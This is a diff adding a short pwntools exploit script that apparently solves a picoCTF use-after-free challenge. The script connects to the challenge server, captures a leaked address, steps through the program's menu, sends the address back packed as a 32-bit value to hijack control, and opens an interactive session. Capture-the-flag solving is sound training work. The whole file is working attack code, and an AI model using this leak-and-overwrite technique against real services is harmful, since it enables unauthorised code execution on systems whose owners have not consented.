@@ -1,0 +1,12 @@
+from pwn import *
+p=remote("mercury.picoctf.net",50361)
+# p=process("./vuln")
+
+p.sendline(b"s")
+p.recvuntil(b"leak...")
+hahaexploitgobrrr=int(p.recvline().decode(),16)
+p.sendline("i")
+p.sendline("y")
+p.sendline("l")
+p.sendlineafter("anyways:",p32(hahaexploitgobrrr))
+p.interactive()
